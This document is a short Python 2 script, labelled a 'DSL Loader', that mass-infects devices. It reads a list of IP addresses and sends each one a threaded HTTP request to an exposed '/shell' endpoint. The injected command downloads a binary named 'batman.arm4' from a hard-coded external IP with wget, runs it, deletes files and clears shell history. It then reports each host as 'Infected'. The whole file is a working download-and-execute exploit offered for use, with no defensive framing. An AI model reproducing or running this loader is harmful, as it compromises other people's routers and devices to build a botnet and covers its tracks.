import random, socket, time, sys, requests, re, os
from sys import stdout
from Queue import *
from threading import Thread

#DSL Loader 
if len(sys.argv) < 2:
    sys.exit("usage: python %s <input list> <port>" % (sys.argv[0]))

ips = open(sys.argv[1], "r").readlines()
port = sys.argv[2]
queue = Queue()
queue_count = 0

def send_payload(host):
        url = "http://" + host + ":" + port + "/shell?cd /tmp; wget http://51.81.29.174/batman.arm4; chmod 777 *; ./batman.arm4; rm -rf *; history -c"
        try:
            output = requests.get(url, timeout=3)
            if output.status_code == int('200'):
                print "\x1b[1;37mxDSL Infected \x1b[1;36m%s\x1b[1;37m" % (host)
	except:
	    pass
	return

def main():

    global queue_count
    for line in ips:
        line = line.strip("\r")
	line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=send_payload, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            os.kill(os.getpid(),9)
    thread.join()
    return

if __name__ == "__main__":
    main()
